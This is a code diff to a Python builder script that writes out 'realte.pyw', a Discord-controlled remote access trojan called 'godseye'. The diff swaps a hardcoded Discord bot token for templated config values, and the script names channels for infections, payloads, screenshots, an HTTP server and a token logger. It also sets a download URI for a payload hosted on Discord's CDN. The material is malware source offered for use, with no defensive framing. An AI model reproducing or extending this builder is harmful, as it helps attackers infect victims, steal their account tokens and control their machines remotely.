@@ -10,10 +10,7 @@ with open('config.json') as f:
     HTP1=config.get('HTP')
     TLC1=config.get('TLC')
 
-mainstr=((("""
-
-
-
+mainstr=(((f"""
 import requests
 import threading 
 import urllib import os
@@ -77,17 +74,17 @@ global CurrentVersion
 global TLC
 
 
-DiscordBotToken = ("ODc4OTgyNjE1MTU4MzU4MDY2.YSJGWg.uFGhwT1KE8y47dyv91Pc5KQPUCc")
-PLC = PLC1  # PAYLOAD-CHANNEL-ID
-IFC = IFC1  # INFECTIONS-CHANNEL-ID
-GRL = GRL1  # GENERAL-CHANNEL-ID
-PIC = PIC1  # SCREENSHOT-CHANNEL-ID
-HTP = HTP1   # HTTPSERVER-CHANNEL-ID
-TLC=TLC1 #tokenlogger channel
+DiscordBotToken ={token}
+PLC = {PLC1}  # PAYLOAD-CHANNEL-ID
+IFC = {IFC1}  # INFECTIONS-CHANNEL-ID
+GRL = {GRL1}  # GENERAL-CHANNEL-ID
+PIC = {PIC1}  # SCREENSHOT-CHANNEL-ID
+HTP = {HTP1}   # HTTPSERVER-CHANNEL-ID
+TLC={TLC1} #tokenlogger channel
 URI ="https://cdn.discordapp.com/attachments/868361386240122880/872168121702699028/Realte.pyw" # PAYLOAD-DOWNLOAD
 OnlineVersion = str(VariableGrab(19))
-
-
+""")))
+str2=((("""
 godseye = commands.Bot(command_prefix=("$"))
 CurrentVersion = "1.0.0.6"
 channelname=external_ip.replace(".","")
@@ -309,3 +306,7 @@ godseye.run(DiscordBotToken)
 f = open("realte.pyw", "x")
 f.write(mainstr)
 f.close()
+f = open("realte.pyw", "a")
+f.write(str2)
+f.close
+
